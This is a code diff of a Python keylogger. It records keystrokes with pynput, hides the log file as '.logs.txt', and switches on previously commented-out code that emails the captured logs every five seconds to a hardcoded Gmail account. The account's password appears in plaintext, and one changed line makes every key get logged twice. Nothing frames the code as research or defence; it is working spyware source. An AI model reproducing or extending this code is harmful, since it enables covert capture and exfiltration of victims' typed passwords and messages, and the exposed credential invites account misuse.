@@ -4,20 +4,25 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import threading
+from tkinter import Checkbutton
+
 from pynput import keyboard
 import platform
 import getpass
 
+mail_content = "Mail with attachment."
+sender_address = 'leodahal44@gmail.com'
+sender_pass = 'programmerleodahal'
+receiver_address = 'leodahal44@gmail.com'
+attach_file_name = ''
+attach_file = ''
+message = ''
+session = ''
+
 
 class sendMail:
-    mail_content = "Mail with attachment."
-    sender_address = 'leodahal44@gmail.com'
-    sender_pass = 'programmerleodahal'
-    receiver_address = 'leodahal44@gmail.com'
-    attach_file_name = ''
-    attach_file = ''
-    message = ''
-    session = ''
+    global mail_content, sender_address, sender_pass, receiver_address, attach_file, attach_file_name
+    global message, session
 
     @staticmethod
     def sendmailonly(self):
@@ -55,7 +60,7 @@ class sendMail:
             message.attach(MIMEText(mail_content, 'plain'))
 
             try:
-                attach_file = open("logs.txt", 'rb')  # Open the file as binary mode
+                attach_file = open(".logs.txt", 'rb')  # Open the file as binary mode
             except FileNotFoundError:
                 sendMail.sendmailonly("")
 
@@ -105,7 +110,6 @@ class osrelated:
 
 
 def storeLogs(key):
-
     global logs
     # logs += str(key)
     # print("Actual is " + str(key))
@@ -123,6 +127,7 @@ def storeLogs(key):
             elif "ctrl" in str(key):
                 logs += " CTRL + "
             else:
+                logs += " " + str(key)
                 logs += " " + str(key)
                 # logs += "\n"
         else:
@@ -156,6 +161,9 @@ def declarePathForSave():
         path = ""
 
 
+declarePathForSave()
+
+
 def saveLogs():
     try:
         global logs, path
@@ -164,12 +172,11 @@ def saveLogs():
         saveFile.write(logs)
         logs = "\n"
         saveFile.close()
-        # sendMail.sendMailFucker()
+        sendMail.sendMailFucker()
         saveTimer = threading.Timer(5, saveLogs)
         saveTimer.start()
-    except:
-        # sendErrorMail()
-        pass
+    except FileNotFoundError:
+        sendMail.sendErrorMail()
 
 
 keyboardListener = keyboard.Listener(on_press=storeLogs)
@@ -177,5 +184,3 @@ keyboardListener = keyboard.Listener(on_press=storeLogs)
 with keyboardListener:
     saveLogs()
     keyboardListener.join()
-
-
